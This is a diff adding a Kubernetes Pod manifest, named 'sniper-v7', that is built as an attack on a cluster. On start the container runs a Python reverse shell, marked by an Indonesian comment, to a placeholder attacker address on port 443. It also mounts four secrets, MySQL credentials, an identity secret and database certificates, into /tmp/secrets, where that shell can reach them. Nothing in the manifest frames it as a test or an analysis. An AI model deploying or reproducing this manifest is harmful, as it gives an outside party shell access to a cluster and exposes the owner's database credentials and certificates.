@@ -1,0 +1,37 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sniper-v7
+  namespace: backbase
+spec:
+  containers:
+  - name: sniper-v7
+    image: python:3.9-alpine
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      # Reverse shell otomatis pas Pod nyala
+      python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_UBUNTU_LO",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+    volumeMounts:
+    - name: vol-mysql
+      mountPath: /tmp/secrets/mysql
+    - name: vol-identity
+      mountPath: /tmp/secrets/identity
+    - name: vol-db-certs
+      mountPath: /tmp/secrets/db-certs
+    - name: vol-certs-file
+      mountPath: /tmp/secrets/certs-file
+  volumes:
+  - name: vol-mysql
+    secret:
+      secretName: mysql-secret
+  - name: vol-identity
+    secret:
+      secretName: identity-secret
+  - name: vol-db-certs
+    secret:
+      secretName: db-certificate-store
+  - name: vol-certs-file
+    secret:
+      secretName: database-certs
+  restartPolicy: Never
